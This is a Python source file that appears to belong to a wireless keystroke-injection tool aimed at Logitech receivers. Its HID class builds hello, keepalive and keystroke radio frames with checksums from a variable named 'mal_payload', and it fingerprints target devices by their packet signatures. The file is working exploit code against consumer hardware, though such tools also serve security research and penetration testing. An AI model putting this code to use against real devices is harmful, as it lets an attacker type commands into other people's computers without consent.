class HID(object):
    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Logitech'
        self.payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
        self.keepalive = [0x00, 0x40, 0x04, 0xB0, 0x0C]
        self.hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]

    def checksum(self, payload):
        checksum = 0xff
        for n in range(0, len(payload) - 1):
            checksum = (checksum - payload[n]) & 0xff
        checksum = (checksum + 1) & 0xff
        payload[-1] = checksum
        return payload

    def key(self, payload, key):
        payload[2] = key['mod']
        payload[3] = key['hid']
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.checksum(self.key(self.payload_template[:], key))

    def build_frames(self, mal_payload):
        for i in range(0, len(mal_payload)):
            key = mal_payload[i]

            if i == 0:
                key['frames'] = [[self.hello[:], 12]]
            else:
                key['frames'] = []

            if i < len(mal_payload) - 1:
                next_key = mal_payload[i + 1]
            else:
                next_key = None

            if key['hid'] or key['mod']:
                key['frames'].append([self.frame(key), 12])
                key['frames'].append([self.keepalive[:], 0])
                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
                    key['frames'].append([self.frame(), 0])
            elif key['sleep']:
                count = int(key['sleep']) / 10
                for i in range(0, int(count)):
                    key['frames'].append([self.keepalive[:], 10])

    @classmethod
    def fingerprint(device_class, p):
        if len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
            return device_class
        elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3:
            return device_class
        elif len(p) == 5 and p[0] == 0 and p[1] == 0x40:
            return device_class
        elif len(p) == 10 and p[0] == 0 and p[1] == 0x4F:
            return device_class
        return None

    @classmethod
    def description(device_class):
        return 'Logitech HID'
